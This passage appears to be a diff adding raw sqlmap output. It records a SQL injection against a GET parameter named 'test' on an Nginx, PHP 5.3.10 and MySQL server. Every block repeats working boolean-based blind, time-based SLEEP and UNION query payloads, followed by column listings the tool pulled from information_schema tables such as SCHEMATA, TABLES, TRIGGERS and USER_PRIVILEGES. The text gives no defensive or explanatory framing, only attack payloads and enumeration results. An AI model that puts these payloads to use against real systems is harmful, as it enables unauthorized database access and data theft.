+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: SCHEMATA
+[5 columns]
++----------------------------+--------------+
+| Column                     | Type         |
++----------------------------+--------------+
+| CATALOG_NAME               | varchar(512) |
+| DEFAULT_CHARACTER_SET_NAME | varchar(32)  |
+| DEFAULT_COLLATION_NAME     | varchar(32)  |
+| SCHEMA_NAME                | varchar(64)  |
+| SQL_PATH                   | varchar(512) |
++----------------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: SCHEMA_PRIVILEGES
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| GRANTEE        | varchar(81)  |
+| IS_GRANTABLE   | varchar(3)   |
+| PRIVILEGE_TYPE | varchar(64)  |
+| TABLE_CATALOG  | varchar(512) |
+| TABLE_SCHEMA   | varchar(64)  |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: SESSION_STATUS
+[2 columns]
++----------------+---------------+
+| Column         | Type          |
++----------------+---------------+
+| VARIABLE_NAME  | varchar(64)   |
+| VARIABLE_VALUE | varchar(1024) |
++----------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: SESSION_VARIABLES
+[2 columns]
++----------------+---------------+
+| Column         | Type          |
++----------------+---------------+
+| VARIABLE_NAME  | varchar(64)   |
+| VARIABLE_VALUE | varchar(1024) |
++----------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: STATISTICS
+[15 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| COLLATION     | varchar(1)   |
+| CARDINALITY   | bigint(21)   |
+| COLUMN_NAME   | varchar(64)  |
+| COMMENT       | varchar(16)  |
+| INDEX_NAME    | varchar(64)  |
+| INDEX_SCHEMA  | varchar(64)  |
+| INDEX_TYPE    | varchar(16)  |
+| NON_UNIQUE    | bigint(1)    |
+| NULLABLE      | varchar(3)   |
+| PACKED        | varchar(10)  |
+| SEQ_IN_INDEX  | bigint(2)    |
+| SUB_PART      | bigint(3)    |
+| TABLE_CATALOG | varchar(512) |
+| TABLE_NAME    | varchar(64)  |
+| TABLE_SCHEMA  | varchar(64)  |
++---------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: TABLES
+[21 columns]
++-----------------+---------------------+
+| Column          | Type                |
++-----------------+---------------------+
+| VERSION         | bigint(21) unsigned |
+| AUTO_INCREMENT  | bigint(21) unsigned |
+| AVG_ROW_LENGTH  | bigint(21) unsigned |
+| CHECK_TIME      | datetime            |
+| CHECKSUM        | bigint(21) unsigned |
+| CREATE_OPTIONS  | varchar(255)        |
+| CREATE_TIME     | datetime            |
+| DATA_FREE       | bigint(21) unsigned |
+| DATA_LENGTH     | bigint(21) unsigned |
+| ENGINE          | varchar(64)         |
+| INDEX_LENGTH    | bigint(21) unsigned |
+| MAX_DATA_LENGTH | bigint(21) unsigned |
+| ROW_FORMAT      | varchar(10)         |
+| TABLE_CATALOG   | varchar(512)        |
+| TABLE_COLLATION | varchar(32)         |
+| TABLE_COMMENT   | varchar(80)         |
+| TABLE_NAME      | varchar(64)         |
+| TABLE_ROWS      | bigint(21) unsigned |
+| TABLE_SCHEMA    | varchar(64)         |
+| TABLE_TYPE      | varchar(64)         |
+| UPDATE_TIME     | datetime            |
++-----------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: TABLE_CONSTRAINTS
+[6 columns]
++--------------------+--------------+
+| Column             | Type         |
++--------------------+--------------+
+| CONSTRAINT_CATALOG | varchar(512) |
+| CONSTRAINT_NAME    | varchar(64)  |
+| CONSTRAINT_SCHEMA  | varchar(64)  |
+| CONSTRAINT_TYPE    | varchar(64)  |
+| TABLE_NAME         | varchar(64)  |
+| TABLE_SCHEMA       | varchar(64)  |
++--------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: TABLE_PRIVILEGES
+[6 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| GRANTEE        | varchar(81)  |
+| IS_GRANTABLE   | varchar(3)   |
+| PRIVILEGE_TYPE | varchar(64)  |
+| TABLE_CATALOG  | varchar(512) |
+| TABLE_NAME     | varchar(64)  |
+| TABLE_SCHEMA   | varchar(64)  |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: TRIGGERS
+[22 columns]
++----------------------------+---------------+
+| Column                     | Type          |
++----------------------------+---------------+
+| ACTION_CONDITION           | longtext      |
+| ACTION_ORDER               | bigint(4)     |
+| ACTION_ORIENTATION         | varchar(9)    |
+| ACTION_REFERENCE_NEW_ROW   | varchar(3)    |
+| ACTION_REFERENCE_NEW_TABLE | varchar(64)   |
+| ACTION_REFERENCE_OLD_ROW   | varchar(3)    |
+| ACTION_REFERENCE_OLD_TABLE | varchar(64)   |
+| ACTION_STATEMENT           | longtext      |
+| ACTION_TIMING              | varchar(6)    |
+| CHARACTER_SET_CLIENT       | varchar(32)   |
+| COLLATION_CONNECTION       | varchar(32)   |
+| CREATED                    | datetime      |
+| DATABASE_COLLATION         | varchar(32)   |
+| DEFINER                    | varchar(77)   |
+| EVENT_MANIPULATION         | varchar(6)    |
+| EVENT_OBJECT_CATALOG       | varchar(512)  |
+| EVENT_OBJECT_SCHEMA        | varchar(64)   |
+| EVENT_OBJECT_TABLE         | varchar(64)   |
+| SQL_MODE                   | varchar(8192) |
+| TRIGGER_CATALOG            | varchar(512)  |
+| TRIGGER_NAME               | varchar(64)   |
+| TRIGGER_SCHEMA             | varchar(64)   |
++----------------------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: test (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: test=query' RLIKE (SELECT (CASE WHEN (3354=3354) THEN 0x7175657279 ELSE 0x28 END))-- tXaL
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))VZYk)-- DWlX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x716b6b7071,0x786a66677958535a4f7247476679707246786f5775415157664a74597669776c6d7359416d767672,0x7171787071),NULL#
+---
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+Table: USER_PRIVILEGES
+[4 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| GRANTEE        | varchar(81)  |
+| IS_GRANTABLE   | varchar(3)   |
+| PRIVILEGE_TYPE | varchar(64)  |
+| TABLE_CATALOG  | varchar(512) |
++----------------+--------------+
+
